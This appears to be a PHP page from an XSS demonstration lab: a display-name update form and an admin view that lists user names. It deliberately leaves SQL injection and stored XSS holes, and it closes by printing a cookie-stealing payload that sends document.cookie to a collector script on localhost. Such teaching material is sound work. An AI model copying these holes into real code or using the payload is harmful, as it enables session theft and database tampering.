<?php
session_start();
if(!$_SESSION['USER_NAME']) {
 echo "Need to login";
}
else {
$Host= '127.0.0.1';
$Dbname= 'xssexample';
$User= 'root';
$Password= '';
$Schema = 'test';
 $Conection_string="host=$Host dbname=$Dbname user=$User password=$Password";
    $Connect = mysql_connect("127.0.0.1",$User,$Password);
 if($_SERVER['REQUEST_METHOD'] == "POST") {
  $query="update $Dbname.$Schema set display_name='".$_POST['disp_name']."' where user_name='".$_SESSION['USER_NAME']."';";
  mysql_query($query);
  echo "Update Success";
 }
 else {
  if(strcmp($_SESSION['USER_NAME'],'admin')==0) {
   echo "Welcome admin<br><hr>";
   echo "List of user's are<br>";
   $query = "select display_name from $Dbname.$Schema where user_name!='admin'";
   $res = mysql_query($query);
   while($row=mysql_fetch_array($res)) {
    echo "$row[display_name]<br>";
   }
 }
 else {
  echo "<form name=\"tgs\" id=\"tgs\" method=\"post\" action=\"home.php\">";
  echo "Update display name:<input type=\"text\" id=\"disp_name\" name=\"disp_name\" value=\"\">";
  echo "<input type=\"submit\" value=\"Update\">";
 }
}
}
echo '<br><br>add folloving as normal user';
echo '<br><br>&lt;a href="#" onclick="document.location=\'http://localhost:90/XSS-Attack-Example/XSS-Attack-Example/saveSession.php?c=\'+escape(document.cookie)"&gt;My Name&lt;/a&gt;';
?>